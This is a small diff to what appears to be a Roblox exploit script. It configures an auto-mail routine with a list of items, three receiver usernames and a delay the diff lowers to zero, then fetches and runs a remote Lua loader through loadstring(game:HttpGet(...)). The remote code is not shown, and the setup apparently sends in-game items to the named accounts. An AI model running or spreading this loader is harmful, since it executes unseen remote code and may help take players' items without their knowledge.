@@ -8,5 +8,5 @@ _G.GMAIL_ITEMS = {
 }
 _G.GMAIL_RECEIVERS = {"Thu_Linhx", "dungxta23", "xuxca2"}
  
-_G.GMAIL_DELAY  = 1
+_G.GMAIL_DELAY  = 0
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/8f386eb537ee7b37a8f0ad37fe6dbc60.lua"))()
